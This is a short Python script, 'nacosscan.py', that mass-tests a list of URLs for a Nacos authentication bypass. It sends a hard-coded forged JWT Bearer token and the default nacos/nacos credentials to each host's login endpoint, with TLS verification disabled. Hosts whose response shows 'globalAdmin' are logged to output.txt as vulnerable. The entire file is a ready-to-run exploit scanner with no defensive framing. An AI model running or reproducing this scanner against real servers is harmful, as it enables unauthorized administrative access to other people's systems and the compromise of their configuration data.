#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2023/4/26 18:44
# @Author  : Lyangdn
# @FileName: nacosscan.py
# @Software: PyCharm

import requests
from urllib.parse import urlparse
#proxy = 'http://127.0.0.1:3000'

with open('url.txt') as f:
    for url in f:
        url = url.strip()
        urlall=f"{url}/v1/auth/users/login"
        parsed_url = urlparse(url)
        parsed_urlall = urlparse(urlall)
        # 提取主机名
        hostname = parsed_url.hostname
        # 提取基础URL
        base_url = parsed_url.scheme + "://" + parsed_url.hostname + "/"
        # 提取路径（/nacos/）
        path = parsed_url.path
        pathall = parsed_urlall.path
        # Define headers for this url
        headers = {
            'Host': f'{hostname}', 
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': f'{base_url}',
            'Referer': f'{url}',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Te': 'trailers',
            'Connection': 'close',
            #请修改以下JWT，'Authorization': 'Bearer 后为JWT构造的语句
            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoiMTY4MjU5MjQwMSJ9.TTXQUb2WtLMJ2L3OI705zVlu0dbpNgeZ32i9JQtQUOc'
        }

        data = {
            'username': 'nacos',
            'password': 'nacos'
        }

        response = requests.post(urlall, headers=headers, data=data,
                                 #proxies={"http": proxy, "https": proxy},
                                 verify=False)
        if response.status_code == 200 and 'globalAdmin' in response.text:
            print(f'存在漏洞: {url}')
            fl = open("output.txt", "a")
            fl.write(f"{url}\n")
            fl.close()
        else:
            print(f'不存在漏洞: {url}')
